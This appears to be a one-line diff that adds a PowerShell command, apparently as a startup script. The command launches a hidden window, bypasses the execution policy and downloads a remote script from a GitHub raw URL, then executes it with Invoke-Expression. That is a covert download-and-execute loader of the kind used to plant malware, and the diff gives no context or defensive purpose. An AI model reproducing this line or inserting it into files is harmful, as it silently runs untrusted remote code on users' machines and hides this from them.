@@ -1,0 +1,1 @@
+powershell -w Hidden -c "Start-Process powershell -ArgumentList '-ep Bypass -w Hidden -c iex (iwr https://raw.githubusercontent.com/LaurenceThornber/startupscript/refs/heads/main/startupscript.ps1 -UseBasicParsing).Content'"
